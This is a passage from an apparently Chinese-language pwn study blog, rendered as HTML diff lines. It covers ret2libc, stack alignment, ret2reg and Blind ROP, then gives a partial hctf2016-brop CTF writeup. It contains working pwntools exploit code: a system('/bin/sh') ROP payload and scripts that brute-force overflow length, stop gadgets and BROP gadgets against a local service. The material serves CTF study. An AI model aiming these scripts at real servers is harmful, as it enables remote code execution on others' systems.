class="string">&#x27;./level&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = gdb.debug(&quot;./level&quot;,&quot;break main&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = flat(cyclic(132),pop_rdi_ret,addr_str_bin_sh,addr_system,pop_rdi_ret,0,)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + p64(ret_addr) +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(addr_exit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload_error = b&#x27;a&#x27; * 136 +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># io.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h4><blockquote>
+<p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。我们都知道栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。</p>
+</blockquote>
+<ul>
+<li>即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</li>
+<li>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：</li>
+<li>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。</li>
+<li>大多数函数的栈帧的边界都必须是16直接的倍数。</li>
+</ul>
+<p>如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">movups</span><br><span class="line">mov //移动指令</span><br><span class="line">u //不必16字节对齐</span><br><span class="line">ps //（packed single-precision floating-point）表示打包的单精度浮点数</span><br><span class="line"></span><br><span class="line">movaps</span><br><span class="line">mov //移动指令</span><br><span class="line">u //必需16字节对齐</span><br><span class="line">ps //（packed single-precision floating-point）表示打包的单精度浮点数</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><blockquote>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
+<li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
+<li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li>
+<li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li>
+</ol>
+</blockquote>
+<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><blockquote>
+<ul>
+<li><code>Blind ROP</code> : BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 <strong>Hacking Blind</strong></li>
+<li>BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流</li>
+</ul>
+</blockquote>
+<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ol>
+<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
+<li><strong>服务器端的进程在崩溃之后会重新启动</strong>，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
+</ol>
+<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>在 BROP 中，基本的遵循的思路如下</p>
+<ul>
+<li><p>判断栈溢出长度</p>
+<ul>
+<li>暴力枚举</li>
+</ul>
+</li>
+<li><p>Stack Reading</p>
+<ul>
+<li><p>获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。</p>
+</li>
+<li><p>目前经典的栈布局</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer|canary|saved fame pointer|saved returned address</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li><p>在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>原理 &lt;&lt;&lt;</span><br><span class="line">调节payload的长度,每次暴力破解一个字节的内容(即payload尾部),如果该byte破解,则payload再加一字节的内容,作为`canary`中的下一部分(byte)</span><br><span class="line">------------------------------</span><br><span class="line">Every Byte includes <span class="number">256</span> = <span class="number">2</span>^<span class="number">8</span></span><br><span class="line"><span class="number">32</span>-bit : <span class="number">4</span> * <span class="number">2</span>^<span class="number">8</span> = <span class="number">2</span>^<span class="number">10</span> = <span class="number">1024</span></span><br><span class="line"><span class="number">64</span>-bit : <span class="number">8</span> * <span class="number">2</span>^<span class="number">8</span> = <span class="number">2</span>^<span class="number">11</span> = <span class="number">2048</span></span><br><span class="line">------------------------------</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="D:\Github\pwn\pwn_study\images\stack_reading.png" alt="stack_reading"></p>
+</li>
+</ul>
+</li>
+<li><p>Blind ROP</p>
+<ul>
+<li><p>最朴素的执行 write 函数的方法就是构造系统调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rdi; ret # socket</span><br><span class="line">pop rsi; ret # buffer</span><br><span class="line">pop rdx; ret # length</span><br><span class="line">pop rax; ret # write syscall number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为<strong>找 write</strong>的方式来获取。</p>
+</li>
+<li><p>找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。</p>
+<ul>
+<li><p>rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可</p>
+<ul>
+<li><p>但是，在程序中很少出现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rdx; ret</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>控制 rdx 的数值</p>
+<blockquote>
+<p>这里需要说明执行 <code>strcmp</code> 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>那么接下来的问题，我们就可以分为两项</p>
+<ul>
+<li>寻找 gadgets<ul>
+<li>控制参数<code>rdi</code>和<code>rsi</code></li>
+</ul>
+</li>
+<li>寻找 PLT 表<ul>
+<li>write 入口</li>
+<li>strcmp 入口</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Build the exploit</p>
+<ul>
+<li>利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。</li>
+</ul>
+</li>
+</ul>
+<h4 id="BROP-gadgets"><a href="#BROP-gadgets" class="headerlink" title="BROP gadgets"></a>BROP gadgets</h4><blockquote>
+<p>从不同偏移处开始反汇编，可以得到对不同<code>register</code>的控制！！！</p>
+<p>最关键的是<code>pop rdi</code>和<code>rsi</code>，设计64位的头两个参数</p>
+</blockquote>
+<p><img src="D:\Github\pwn\pwn_study\images\brop_gadget.png" alt="brop_gadget"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble 0x4007ba,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007ba to 0x4007c5:</span><br><span class="line">   0x00000000004007ba &lt;__libc_csu_init+90&gt;:	pop    rbx</span><br><span class="line">   0x00000000004007bb &lt;__libc_csu_init+91&gt;:	pop    rbp</span><br><span class="line">   0x00000000004007bc &lt;__libc_csu_init+92&gt;:	pop    r12</span><br><span class="line">   0x00000000004007be &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x00000000004007c0 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x00000000004007c2 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemble 0x4007ba+0x7,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007c1 to 0x4007c5:</span><br><span class="line">   0x00000000004007c1 &lt;__libc_csu_init+97&gt;:	pop    rsi</span><br><span class="line">   0x00000000004007c2 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemble 0x4007ba+0x9,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007c3 to 0x4007c5:</span><br><span class="line">   0x00000000004007c3 &lt;__libc_csu_init+99&gt;:	pop    rdi</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="stop-gadgets"><a href="#stop-gadgets" class="headerlink" title="stop gadgets"></a>stop gadgets</h4><blockquote>
+<p>所谓<code>stop gadget</code>一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。之所以要寻找 <code>stop gadgets</code>，是因为当我们猜到某个 gadgtes 后，如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了</p>
+</blockquote>
+<h5 id="定义栈上的三种地址Probe"><a href="#定义栈上的三种地址Probe" class="headerlink" title="定义栈上的三种地址Probe"></a>定义栈上的三种地址Probe</h5><ul>
+<li>Probe<ul>
+<li>探针，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。</li>
+</ul>
+</li>
+<li>Stop<ul>
+<li>不会使得程序崩溃的 stop gadget 的地址。</li>
+</ul>
+</li>
+<li>Trap<ul>
+<li>可以导致程序崩溃的地址</li>
+</ul>
+</li>
+</ul>
+<h4 id="stack-探测"><a href="#stack-探测" class="headerlink" title="stack 探测"></a>stack 探测</h4><ul>
+<li>我们可以通过在栈上摆放不同顺序的 <strong>Stop</strong> 与 <strong>Trap</strong> 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子<ul>
+<li><code>probe,stop,traps(traps,traps,...)</code><ul>
+<li>我们通过程序崩溃与否 (如果程序在 probe 处直接崩溃怎么判断) 可以找到不会对栈进行 pop 操作的 gadget，如<ul>
+<li>ret</li>
+<li>xor eax,eax; ret</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>probe,trap,stop,traps</code><ul>
+<li>我们可以通过这样的布局找到<strong>只是弹出一个栈变量</strong>的 gadget。如<ul>
+<li>pop rax; ret</li>
+<li>pop rdi; ret</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>probe, trap, trap, trap, trap, trap, trap, stop, traps</code><ul>
+<li>我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的… …这里一般来说会遇到两处比较有意思的地方<ul>
+<li><code>plt</code> 处不会崩，，</li>
+<li><code>_start</code> 处不会崩，相当于程序重新执行。</li>
+<li>需要注意的是向 BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>需要注意的是 <code>probe</code> 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.</li>
+</ul>
+<h4 id="寻找-plt"><a href="#寻找-plt" class="headerlink" title="寻找 plt"></a>寻找 plt</h4><blockquote>
+<p>如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 <code>16</code> 字节。而且，在每一个表项的 <code>6</code> 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。</p>
+</blockquote>
+<p><img src="D:\Github\pwn\pwn_study\images\brop_plt.png" alt="brop_plt"></p>
+<blockquote>
+<p>对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了<strong>一系列的长度为 16 的没有使得程序崩溃的代码段</strong>，那么我们有一定的理由相信我们遇到了 <code>plt</code> 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。</p>
+</blockquote>
+<h4 id="控制-rdx"><a href="#控制-rdx" class="headerlink" title="控制 rdx"></a>控制 rdx</h4><blockquote>
+<ul>
+<li><p>并不是所有的程序都会调用 strcmp 函数</p>
+</li>
+<li><p>这里给出程序中使用 strcmp 函数的情况。</p>
+</li>
+<li><p>定义以下两种地址</p>
+<ul>
+<li>readable，可读的地址。</li>
+<li>bad, 非法地址，不可访问，比如说 0x0。</li>
+</ul>
+</li>
+<li><p>如果控制传递的参数为这两种地址的组合，会出现以下四种情况</p>
+<ul>
+<li>strcmp(bad,bad)</li>
+<li>strcmp(bad,readable)</li>
+<li>strcmp(readable,bad)</li>
+<li>strcmp(readable,readable)</li>
+</ul>
+<p>只有最后一种格式，程序才会正常执行。</p>
+</li>
+<li><p>没有 PIE 保护的时候，64 位程序的 ELF 文件的 <code>0x400000</code> 处有 7 个非零字节。</p>
+</li>
+</ul>
+</blockquote>
+<h4 id="寻找输出函数"><a href="#寻找输出函数" class="headerlink" title="寻找输出函数"></a>寻找输出函数</h4><blockquote>
+<p>寻找输出函数既可以寻找 write，也可以寻找 puts。一般现先找 puts 函数。不过这里为了介绍方便，先介绍如何寻找 write。</p>
+</blockquote>
+<h5 id="寻找write-plt"><a href="#寻找write-plt" class="headerlink" title="寻找write@plt"></a>寻找write@plt</h5><p>当我们可以控制 write 函数的三个参数的时候，我们就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值</p>
+<ul>
+<li>使用 rop chain，同时使得每个 rop 对应的文件描述符不一样</li>
+<li>同时打开多个连接，并且我们使用相对较高的数值来试一试。</li>
+</ul>
+<p>需要注意的是</p>
+<ul>
+<li>linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。</li>
+<li>posix 标准每次申请的文件描述符数值总是当前最小可用数值。</li>
+</ul>
+<p>当然，我们也可以选择寻找 puts 函数。</p>
+<h5 id="寻找puts-plt"><a href="#寻找puts-plt" class="headerlink" title="寻找puts@plt"></a>寻找puts@plt</h5><p>寻找 <code>puts</code> 函数 (这里我们寻找的是<code>plt</code>)，我们自然需要控制 <code>rdi</code> 参数，在上面，我们已经找到了 <code>brop gadget</code>。那么，我们根据 <code>brop gadget</code> 偏移 9 可以得到相应的 <code>gadgets</code>（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。一般来说，其 payload 如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*length +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="writeup-brop"><a href="#writeup-brop" class="headerlink" title="writeup_brop"></a>writeup_brop</h2><blockquote>
+<p>采取题目是<code>hctf2016-brop</code></p>
+</blockquote>
+<h3 id="确定栈溢出长度"><a href="#确定栈溢出长度" class="headerlink" title="确定栈溢出长度"></a>确定栈溢出长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbuffer_len</span>():</span><br><span class="line">  i=<span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">      io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">      io.send(i*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">      output = io.recv()</span><br><span class="line">      io.close()</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    buffer_len = getbuffer_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The length of buffer overflow is &quot;</span>,buffer_len)</span><br></pre></td></tr></table></figure>
+
+<p>最终得到<code>buffer</code>长度</p>
+<img src="D:\Github\pwn\pwn_study\images\brop_buffer_len.png" alt="brop_buffer_len" style="zoom:50%;" />
+
+<p>首先确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。</p>
+<h3 id="寻找-stop-gadgets"><a href="#寻找-stop-gadgets" class="headerlink" title="寻找 stop gadgets"></a>寻找 stop gadgets</h3><blockquote>
+<p>通常addr初始值设为<code>0x400000</code>，但这个题目我为了节约时间就改成<code>0x4006b0</code>，通常在<code>_start</code>入口处前后会有<code>stop_gadgets</code></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">length</span>):</span><br><span class="line">  addr = <span class="number">0x4006b0</span>  <span class="comment"># No PIE</span></span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">      io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">      io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">      payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(addr)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;Temporary address is 0x%x&#x27;</span>%(addr))</span><br><span class="line">      io.sendline(payload)</span><br><span class="line">      content = io.recv()  <span class="comment"># if recv() doesn&#x27;t cause crash, it means that it is a stop gadgets</span></span><br><span class="line">      io.close()  <span class="comment"># sometimes _start will not cause crash</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;One success addr: 0x%x&#x27;</span> % (addr))</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;When the addr is found successfully, you will recieve the message from the remote: &#x27;</span>,content)</span><br><span class="line">      <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">      addr += <span class="number">1</span></span><br><span class="line">      io.close()</span><br></pre></td></tr></table></figure>
+
+<p>结合中间输出可以让结果有迹可循一点，次数找到了<code>0x4006b6</code>，为了找到开始地址，可以输出程序没有崩溃时的接收结果，看是否与程序开始时候的提示一致。</p>
+<p><img src="D:\Github\pwn\pwn_study\images\brop_stop_gadgets.png" alt="brop_stop_gadgets"></p>
+<h3 id="寻找-brop-gadgets"><a href="#寻找-brop-gadgets" class="headerlink" title="寻找 brop gadgets"></a>寻找 brop gadgets</h3><blockquote>
+<p>此处是为了找到<code>__libc_csu_init</code>的末尾那一段重要部分，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] </span><br><span class="line">pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret</span><br><span class="line">[*] + 0x7 </span><br><span class="line">pop rsi, pop r15, ret</span><br><span class="line">[*] + 0x9</span><br><span class="line">pop rdi, ret</span><br></pre></td></tr></table></figure>
+
+<p>需要借助</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; probe, trap, trap, trap, trap, trap, trap, stop, traps</span><br><span class="line"></span><br><span class="line">[*] probe : testing pointer.</span><br><span class="line">[*] traps : (trap, trap,...), you can add <span class="number">10</span> traps or more to avoid the special situations.</span><br><span class="line">[*] Sometimes <span class="title function_">p64</span><span class="params">(<span class="number">0</span>)</span> is a good example of trap.</span><br></pre></td></tr></table></figure>
+
+<p>来识别</p>
+</blockquote>
+<p>识别<code>brop gadgets</code>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_addr, addr</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    content = io.recv()</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="comment"># stop gadget returns memory</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">b&#x27;WelCome&#x27;</span>): &lt;---注意这里判断的必须是 <span class="built_in">bytes</span> 类型, 所以需要在string头加一个b</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):</span><br><span class="line">  <span class="string">&quot;&quot;&quot; Just for checking brop possible gadget &quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">10</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brop_gadget</span>(<span class="params">length, stop_gadget, init_addr</span>):</span><br><span class="line">  addr = init_addr</span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % (addr))</span><br><span class="line">      <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % (addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="确定-addr-gt-puts-plt"><a href="#确定-addr-gt-puts-plt" class="headerlink" title="确定 addr-&gt;puts@plt"></a>确定 addr-&gt;puts@plt</h3><blockquote>
+<h4 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h4><ol>
+<li>对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。</li>
+<li>寻找 puts 函数 (这里我们寻找的是<code>plt</code>)，我们自然需要控制 <code>rdi</code> 参数，在上面，我们已经找到了 <code>brop gadget</code>。那么，我们根据 <code>brop gadget</code> 偏移 <code>0x9</code> 可以得到相应的 <code>gadgets</code>（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，<code>0x400000</code> 处为 ELF 文件的头部，其内容为 <code>\ x7fELF</code>。所以我们可以根据这个来进行判断。一般来说，其 payload 如下</li>
+</ol>
+</blockquote>
+<ol>
+<li><p>关于<code>rdi_ret</code>的获取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdi_ret = brop_gadget_addr + <span class="number">0x9</span></span><br></pre></td></tr></table></figure>
+</li>
